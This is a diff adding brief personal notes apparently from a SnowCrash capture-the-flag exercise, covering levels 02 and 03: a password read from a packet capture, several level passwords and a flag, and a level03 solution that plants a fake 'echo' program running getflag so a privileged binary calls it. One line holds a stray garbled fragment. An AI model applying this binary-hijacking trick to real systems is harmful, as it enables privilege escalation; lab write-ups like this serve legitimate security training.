@@ -1,0 +1,6 @@
+step 1 : i copy scp -P 4242 level02@10.12.100.250:/home/user/level02/level02.pcap /Users/myamani/Desktop/SnowCrash/level02/Resources
+step 2 : open level02.pcap in https://www.cloudshark.org/ > importing the file > analysis tools > Follow TCP Stream flag02 passowrd  is: ft_waNDReL0L
+idi4f57q8iqstep 2 : level03 passowrd is : kooda2puivaav1
+step 3 : ltrace ./level03 (is a program that simply runs the specified command until it exits. It intercepts and records the dynamic library calls which are called by the executed process and the signals which are received by that process. It can also intercept and print the system calls executed by the program.)
+step 4 : vim /etc/echo ( create our echo program has echo $(getflag) command )
+step 5 : and now we execute ./level03 to get the flag "qi0maab88jeaj46qoumi7maus"
